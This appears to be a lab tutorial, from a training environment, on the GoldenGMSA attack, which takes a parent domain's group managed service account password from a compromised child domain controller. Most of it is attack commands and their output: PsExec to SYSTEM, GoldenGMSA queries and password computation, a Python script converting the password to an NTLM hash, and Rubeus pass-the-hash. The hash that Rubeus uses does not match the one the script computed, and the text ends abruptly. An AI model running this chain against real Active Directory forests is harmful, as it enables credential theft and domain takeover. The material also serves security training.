If we discover a gMSA account in a parent domain and wish to compromise it from a child domain across trust boundaries, we can utilize the `GoldenGMSA tool` to launch an attack across the trust relationship and obtain the password of the `gMSA` present in the parent domain.

To execute the GoldenGMSA attack using [GoldenGMSA tool](https://github.com/Semperis/GoldenGMSA), an attacker must need access to following specific attributes of the KDS Root Key in the forest root (Parent Domain):
- `cn`
- `msKds-SecretAgreementParam`
- `msKds-RootKeyData`
- `msKds-KDFParam`
- `msKds-KDFAlgorithmID`
- `msKds-CreateTime`
- `msKds-UseStartTime`
- `msKds-Version`
- `msKds-DomainID`
- `msKds-PrivateKeyLength`
- `msKds-PublicKeyLength`
- `msKds-SecretAgreementAlgorithmID`

<font color="#c00000">It is worth noting that this attack requires a high level of access (`SYSTEM`) within the child domain controller, which is not easily achievable without a significant level of pre-existing compromise.</font>
## What is a gMSA?
 [group Managed Service Accounts (gMSA)](https://learn.microsoft.com/en-us/azure/active-directory/fundamentals/service-accounts-group-managed), as the Windows operating system takes on the responsibility of managing the password for the account, eliminating the need for manual password management by administrators.
The password for the gMSA is handled by Active Directory (AD) and is rotated automatically every 30 days. The new password is randomly generated and consists of 256 bytes, making it incredibly difficult to crack. The password is determined by combining a periodically changing secret and certain unnamed attributes of the gMSA. This secret is stored in the KDS root key object. In order to retrieve gMSA passwords in a given domain, one must need access to a server or a user that is an authorized principal to retrieve the managed Password for gMSA (i.e., stored in the `msDS-ManagedPassword` attribute)

## How to setup one?
```powershell-session
New-ADServiceAccount -Name "apache-dev" -DNSHostName "inlanefreight.ad" -PrincipalsAllowedToRetrieveManagedPassword htb-student-1 -Enabled $True
```
In this example the *gMSA* named **"Apache-dev"** is setup on the *Parent domain(INLANEFREIGHT.AD)* and only the user **htb-student-1** is allowed to read it secrets therefore it makes as a juicy target.

# Attack
## Attack Explanation
Normally all the attribute explained before needed for the attack can be obtained via **ADSIEdit** on the parent domain under the key  `msKds-ProvRootKey`:
 `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,DC=inlanefreight,DC=ad`

Unfortunately you need the following membership in order to reach it on the Parent DC:
1. Membership in the `Enterprise Admins` group in forest root domain
2. Membership in the `Domain Admins` group in forest root domain
3. Access to a domain controller as `NT/AUTHORITY SYSTEM`

The caveat here is to take advantage of the replication between Child -> Host and vice versa allowing  us to read the DACL on the Child DC which holds a local copy of the replicated DN data!

## Online Attack
Spin up a Powershell session as NTSystem on the Child domain(where we hold Admin rights so far...) and launch the **adsiedit.msc**
```powershell-session
.\PsExec.exe -s -i powershell.exe
PS C:\Windows\system32> whoami
nt authority\system
```
Now all the information can be obtained from the **Master Root Key** from the DN path:
```
CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,DC=inlanefreight,DC=ad
```
Easiest is to automate the attack by using [this](https://github.com/Semperis/GoldenGMSA)) C# tool that with interrogate both the Parent/Child domain in order to exfiltrate the gMSA credentials.
1. Query the parent domain `inlanefreight.ad` to obtain the `SID` of the gMSA account.
2. Use the obtained SID of gMSA to calculate the password of the gMSA account by `querying` both domains.

Remember again to execute this from a shell as NTSYSTEM otherwise the attack will fail cause the tool won't be able to read the DACL.
First we need to interrogate the Parent domain and fetch the domain sid:
```powershell-session
.\GoldenGMSA.exe gmsainfo --domain inlanefreight.ad
sAMAccountName:         svc_devadm$
objectSid:              S-1-5-21-2879935145-656083549-3766571964-1106
rootKeyGuid:            ba932c0c-5c34-ce6e-fcb8-d441d116a736
msds-ManagedPasswordID: AQAAAEtEU0sCAAAAaQEAABEAAAAfAAAADCyTujRcbs78uNRB0RanNgAAAAAiAAAAIgAAAEkATgBMAEEATgBFAEYAUgBFAEkARwBIAFQALgBBAEQAAABJAE4ATABBAE4ARQBGAFIARQBJAEcASABUAC4AQQBEAAAA
```
And now by sending the **Domainsid(Parent)** the **forest(Child)** and the **domain(Parent)** the tool will calculate and obtain the credentials from gMSA saved on the *Parent from the Child*.
```powershell-session
.\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-1106" --forest dev.inlanefreight.ad --domain inlanefreight.ad
Base64 Encoded Password:        WITSKRtGahQFvL/iUmJfQbRIJ7S7GMW+nKUj+TlJ4YZJyZ6pjlp5caC78rC4oY6woKxe294/hPCCl6nL2NNWSmj6f1GlmFKvizvlABXVpLqIGbQvyZEbYhPr+twasnf4m+B0qmwj4fXUx8qQAy+cEIV8sd18ZvOLKet7259cIbXTV1lbO3gxIEmDDjMmgP6QD1GQDHnr4xxgwR5YKZC9CbK01db3SWlpPYxElx30MGwzMLtL17ccxmGYAMzqNq/R9ldEq/hC4WDJ3hGg4CVagcOuHOQPOJ6Nh0+x4CBE46CoshfID+3wyswFI/akytdBDVyNk1hj9KH4v/kizCPw6A== 
```
This password is **B64 + md4** encoded so we need to convert it back to a hash that can be useful for future use.  We can use the following python script.
```python
import hashlib
import base64
 
base64_input  = "WITSKRtGahQFvL/iUmJfQbRIJ7S7GMW+nKUj+TlJ4YZJyZ6pjlp5caC78rC4oY6woKxe294/hPCCl6nL2NNWSmj6f1GlmFKvizvlABXVpLqIGbQvyZEbYhPr+twasnf4m+B0qmwj4fXUx8qQAy+cEIV8sd18ZvOLKet7259cIbXTV1lbO3gxIEmDDjMmgP6QD1GQDHnr4xxgwR5YKZC9CbK01db3SWlpPYxElx30MGwzMLtL17ccxmGYAMzqNq/R9ldEq/hC4WDJ3hGg4CVagcOuHOQPOJ6Nh0+x4CBE46CoshfID+3wyswFI/akytdBDVyNk1hj9KH4v/kizCPw6A=="

print(hashlib.new("md4", base64.b64decode(base64_input)).hexdigest())
```
And running the script can give us a resembled RC4/NTLM password hash.
```shell-session
└─# python3 golden_gmsa_decoder.py 
f6d16f12e5b18e38c852a9203077be38
```
Lastly, as usual perform a PTH aka pass the hash to take foothold into AD environment.
```powershell-session
.\Rubeus.exe asktgt /user:svc_devadm$ /rc4:32ac66cd327aa76b3f1ca6eb82a801c5 /domain:inlanefreight.ad /ptt
______        _
```